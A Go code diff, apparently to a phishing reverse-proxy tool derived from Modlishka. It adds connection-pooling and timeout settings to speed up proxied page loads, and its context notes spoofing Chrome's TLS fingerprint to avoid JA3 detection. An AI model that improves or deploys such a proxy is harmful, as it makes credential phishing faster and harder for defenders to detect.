@@ -206,6 +206,15 @@ const (
 const (
 	httpReadTimeout  = 600 * time.Second
 	httpWriteTimeout = 600 * time.Second
+
+	// Connection pool and speed optimization settings
+	maxIdleConns        = 200              // Total idle connections across all hosts
+	maxIdleConnsPerHost = 50               // Idle connections per-host (default is 2!)
+	maxConnsPerHost     = 100              // Max total connections per-host
+	idleConnTimeout     = 90 * time.Second // Keep idle connections alive longer
+	tlsHandshakeTimeout = 10 * time.Second // TLS handshake deadline
+	expectContTimeout   = 1 * time.Second  // Expect: 100-continue timeout
+	respHeaderTimeout   = 30 * time.Second // Wait for response headers
 )
 
 // original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
@@ -362,6 +371,25 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
 		}
 	}
+
+	// ════════════════════════════════════════════════════════════════════════
+	// REVERSE PROXY SPEED OPTIMIZATION
+	// ════════════════════════════════════════════════════════════════════════
+	// These settings dramatically improve page load times by:
+	// 1. Reusing connections (connection pooling) instead of new TCP+TLS per request
+	// 2. Keeping idle connections alive longer to avoid handshake overhead
+	// 3. Allowing more parallel connections to upstream servers
+	// ════════════════════════════════════════════════════════════════════════
+	p.Proxy.Tr.MaxIdleConns = maxIdleConns
+	p.Proxy.Tr.MaxIdleConnsPerHost = maxIdleConnsPerHost
+	p.Proxy.Tr.MaxConnsPerHost = maxConnsPerHost
+	p.Proxy.Tr.IdleConnTimeout = idleConnTimeout
+	p.Proxy.Tr.TLSHandshakeTimeout = tlsHandshakeTimeout
+	p.Proxy.Tr.ExpectContinueTimeout = expectContTimeout
+	p.Proxy.Tr.ResponseHeaderTimeout = respHeaderTimeout
+	p.Proxy.Tr.DisableCompression = false // Allow gzip/brotli from upstream
+	p.Proxy.Tr.ForceAttemptHTTP2 = true   // Prefer HTTP/2 for multiplexing
+	log.Info("transport: connection pooling enabled (max_idle=%d, per_host=%d)", maxIdleConns, maxIdleConnsPerHost)
 
 	// uTLS: Chrome 120 TLS fingerprint on ALL outgoing connections.
 	// Go's default net/http JA3 (4d7a28d6f2263ed61de88ca66eb2e98) is
